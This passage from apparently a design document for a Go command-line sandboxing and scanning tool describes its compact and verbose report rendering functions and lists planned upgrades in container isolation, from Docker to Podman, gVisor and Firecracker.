`--fail-on-scan`, and `--no-scan` behave identically in both modes. Compact
rendering lives in `printCompactReport`/`printCompactEgressLine`/
`summarizeCompactResult` (`cmd/run.go`) and `printCompactScanSection`/
`printTopFindings`/`restHint` (`cmd/scan.go`); the pre-existing full-detail
rendering (`printPreRunNotice`/`printScanSection`/`printResult`) is unchanged
and now only runs under `-v`. The spinner (`newSpinner`/`start`/`setLabel`/
`stop` in `cmd/spinner.go`) writes only to stderr, so it never touches the
report on stdout in either mode.

## Upgrade paths summary

- CLI shelling -> Docker Go SDK (same `Runner` interface).
- Docker daemon -> Podman rootless -> gVisor -> Firecracker (increasing
  isolation strength; decreasing trust in a privileged daemon).
